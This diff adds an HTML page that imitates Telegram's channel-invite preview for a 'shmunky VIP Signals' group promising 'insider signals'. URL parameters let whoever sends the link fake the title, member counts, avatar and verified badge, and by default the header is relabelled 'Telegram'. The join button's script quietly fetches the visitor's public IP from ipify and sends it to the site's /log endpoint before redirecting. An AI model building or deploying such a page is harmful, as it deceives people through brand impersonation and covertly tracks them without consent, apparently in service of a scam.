@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Aether Link - Holographic Chat Node</title>
+    
+    <!-- Premium Fonts: Kanit and Outfit for absolute futuristic tech aesthetics -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600&family=Outfit:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome for futuristic HUD icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+  <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Kanit', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        /* Variables for easy theme switching */
+        :root {
+            --bg-color: #ffffff;
+            --header-bg: #ffffff;
+            --border-color: #e6e6e6;
+            --text-main: #000000;
+            --text-muted: #707579;
+            --text-desc: #333333;
+            --logo-bg: #24da76; /* Premium Mint/Emerald Green logo */
+            --accent-blue: #33a1e4;
+            --btn-bg: #24d366; /* Vibrant WhatsApp Green from screenshot */
+            --btn-hover: #1ebe5d;
+            --card-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            --badge-color: #2ca5e0;
+        }
+
+        /* Dark Mode variables applied when class 'dark-mode' is present */
+        .dark-mode {
+            --bg-color: #17212b;
+            --header-bg: #242f3d;
+            --border-color: #101921;
+            --text-main: #ffffff;
+            --text-muted: #7f91a4;
+            --text-desc: #f5f6f7;
+            --logo-bg: #24da76;
+            --accent-blue: #5288c1;
+            --btn-bg: #24d366; 
+            --btn-hover: #1ebe5d;
+            --card-shadow: 0 4px 20px rgba(0,0,0,0.25);
+            --badge-color: #40a7e3;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            opacity: 0;
+            animation: fadeIn 0.6s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        /* --- 1. HEADER --- */
+        .tg-header {
+            width: 100%;
+            background-color: var(--header-bg);
+            border-bottom: 1px solid var(--border-color);
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 5%;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+        }
+
+        .tg-logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text-main);
+            transition: color 0.3s ease;
+        }
+
+        .tg-logo-icon {
+            width: 30px;
+            height: 30px;
+            background-color: var(--logo-bg);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            box-shadow: 0 2px 5px rgba(36,211,102,0.2);
+            transition: transform 0.2s ease;
+        }
+
+        .tg-logo-container:hover .tg-logo-icon {
+            transform: scale(1.05);
+        }
+
+        .tg-logo-text {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        /* Notice Banner */
+        .tg-notice-banner {
+            width: 100%;
+            background-color: var(--accent-blue);
+            color: #ffffff;
+            text-align: center;
+            padding: 10px 15px;
+            font-size: 13.5px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        .tg-notice-banner:hover {
+            opacity: 0.95;
+        }
+
+        /* Main Content Box */
+        .tg-main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 50px 20px 30px 20px;
+            text-align: center;
+            max-width: 620px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Avatar Container */
+        .avatar-wrapper {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            overflow: hidden;
+            background: linear-gradient(135deg, #24da76 0%, #0ba360 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 48px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            box-shadow: var(--card-shadow);
+            position: relative;
+            user-select: none;
+            transition: box-shadow 0.3s ease;
+        }
+
+        .avatar-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        /* Titles and stats styling */
+        .group-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: color 0.3s ease;
+        }
+
+        .group-title i.verified-badge {
+            color: var(--badge-color);
+            font-size: 20px;
+        }
+
+        .group-stats {
+            font-size: 14.5px;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+            font-weight: 400;
+            transition: color 0.3s ease;
+        }
+
+        .group-description {
+            font-size: 15px;
+            color: var(--text-desc);
+            line-height: 1.6;
+            margin-bottom: 30px;
+            word-break: break-word;
+            max-width: 480px;
+            transition: color 0.3s ease;
+        }
+
+        /* Action Button */
+        .btn-view-tg {
+            background-color: var(--btn-bg);
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            padding: 13px 40px;
+            border-radius: 30px;
+            display: inline-block;
+            box-shadow: 0 4px 12px rgba(36, 211, 102, 0.3);
+            transition: background-color 0.2s ease, transform 0.1s ease, box-shadow 0.2s ease;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-view-tg:hover {
+            background-color: var(--btn-hover);
+            box-shadow: 0 6px 16px rgba(36, 211, 102, 0.4);
+        }
+
+        .btn-view-tg:active {
+            transform: scale(0.97);
+        }
+
+        /* Extra Decorative lines */
+        .separator-line {
+            width: 100%;
+            height: 1px;
+            background-color: var(--border-color);
+            margin: 40px 0 20px 0;
+            max-width: 400px;
+            transition: background-color 0.3s ease;
+        }
+
+        /* Helper styles */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. HEADER -->
+    <header class="tg-header">
+        <a href="#" class="tg-logo-container">
+            <div class="tg-logo-icon">
+                <i class="fa-solid fa-paper-plane" id="logo-icon-img"></i>
+            </div>
+            <span class="tg-logo-text" id="logo-brand-name">shmunky</span>
+        </a>
+    </header>
+
+    <!-- 2. NOTICE BANNER -->
+    <div class="tg-notice-banner" id="notice-banner" onclick="handleNoticeClick()">
+        Don't have shmunky yet? Get it now!
+    </div>
+
+    <!-- 3. MAIN CARD CONTENT -->
+    <main class="tg-main-content">
+        
+        <!-- Avatar Wrapper -->
+        <div class="avatar-wrapper" id="avatar-container">
+            <span id="avatar-initials">S</span>
+            <img id="avatar-img" class="hidden" src="" alt="Group Avatar">
+        </div>
+
+        <!-- Group Title -->
+        <h1 class="group-title" id="group-title-el">
+            <span id="group-title-text">shmunky VIP Signals</span>
+            <i class="fa-solid fa-circle-check verified-badge" id="verified-badge-icon" title="Verified Channel"></i>
+        </h1>
+
+        <!-- Group Stats -->
+        <div class="group-stats" id="group-stats-el">
+            <span id="members-count">185,420</span> members, <span id="online-count">4,219</span> online
+        </div>
+
+        <!-- Group Description -->
+        <p class="group-description" id="group-desc-el">
+            Official shmunky channel. Join for daily high-potential group access and insider signals.
+        </p>
+
+        <!-- Dynamic Action Button -->
+        <button class="btn-view-tg" id="join-btn" onclick="handleJoinClick()">
+            View in Telegram
+        </button>
+
+        <div class="separator-line"></div>
+    </main>
+
+    <!-- Page Initialization Script -->
+    <script>
+        function getQueryParams() {
+            const params = {};
+            const search = window.location.search.substring(1);
+            if (search) {
+                const parts = search.split('&');
+                for (let i = 0; i < parts.length; i++) {
+                    const pair = parts[i].split('=');
+                    const key = decodeURIComponent(pair[0]);
+                    const val = decodeURIComponent(pair[1] || '');
+                    params[key] = val;
+                }
+            }
+            return params;
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = getQueryParams();
+
+            // 1. Theme Configuration (Forced to Always Light Mode)
+            const platform = params.platform || 'tg_light';
+            document.body.classList.remove('dark-mode');
+
+            // 2. Load Values from URL parameters
+            const title = params.title || 'shmunky VIP Signals';
+            const desc = params.desc || 'Official shmunky channel. Join for daily high-potential group access and insider signals.';
+            const members = params.members || '185,420';
+            const online = params.online || '4,219';
+            const avatar = params.avatar || '';
+            const verified = params.verified !== '0'; // default to true, set to '0' to disable
+
+            // Set HTML elements
+            document.getElementById('page-title').textContent = `${title} - Join Chat`;
+            document.getElementById('group-title-text').textContent = title;
+            document.getElementById('group-desc-el').textContent = desc;
+            document.getElementById('members-count').textContent = members;
+            document.getElementById('online-count').textContent = online;
+
+            // Set brand logo text based on platform or customized title
+            let brandName = 'shmunky';
+            if (platform.startsWith('tg')) {
+                brandName = 'Telegram';
+            }
+            document.getElementById('logo-brand-name').textContent = brandName;
+            document.getElementById('notice-banner').textContent = `Don't have ${brandName} yet? Get it now!`;
+
+            // Verified Badge
+            if (!verified) {
+                document.getElementById('verified-badge-icon').classList.add('hidden');
+            }
+
+            // Avatar Configuration
+            const avatarImg = document.getElementById('avatar-img');
+            const avatarInitials = document.getElementById('avatar-initials');
+            
+            if (avatar) {
+                avatarImg.src = avatar;
+                avatarImg.classList.remove('hidden');
+                avatarInitials.classList.add('hidden');
+            } else {
+                // Generate initials from title
+                const initials = title
+                    .split(' ')
+                    .map(word => word.charAt(0))
+                    .join('')
+                    .substring(0, 2)
+                    .toUpperCase();
+                avatarInitials.textContent = initials || 'S';
+                avatarImg.classList.add('hidden');
+                avatarInitials.classList.remove('hidden');
+            }
+        });
+
+        function handleJoinClick() {
+            // Get public IP, send to server, then redirect
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => fetch('/log?ip=' + data.ip))
+                .catch(() => fetch('/log'))
+                .finally(() => {
+                    window.location.href = 'tg://resolve?domain=shmunky';
+                });
+        }
+
+        function handleNoticeClick() {
+            window.open('https://telegram.org/', '_blank');
+        }
+    </script>
+</body>
+</html>
